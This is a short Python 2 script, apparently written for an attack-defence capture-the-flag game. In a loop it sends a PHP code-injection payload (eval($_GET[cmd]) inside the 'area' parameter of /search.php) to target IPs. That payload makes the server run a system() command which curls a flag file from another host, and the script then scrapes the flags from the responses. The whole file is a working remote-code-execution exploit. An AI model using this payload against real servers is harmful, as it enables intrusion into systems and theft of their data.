__author__ = 'tom'
# -*- coding:utf-8 -*-
import requests
import re
import sys
import threading
import time

iplist = ["192.168.49.148"]
port = "8033"

order = "curl http://192.168.0.112/flag.php"
targetPath = "/search.php?searchtype=5&tid=&area=eval($_GET[cmd])&cmd=system(\""+order+"\");"

flagList = []
errList = []
def getFlag(url):
    try :
        req = requests.get(url)
        cnt = req.text
        ix = cnt.index("<!DO")
        cnt = cnt[:ix]
        length = len(cnt)
        flag = cnt[:length/9]
        if flag not in flagList :
            print url
            print "--->" + flag
            flagList.append(flag)
    except :
        err = url + " ****error!****"
        if err not in errList :
            print err
            errList.append(err)

while True :
    for ip in iplist :
        url = "http://" + ip + ":" + port + targetPath
        #thd = threading.Thread(target=getFlag, args=(url,))
        #thd.start()
        getFlag(url)

    time.sleep(5)




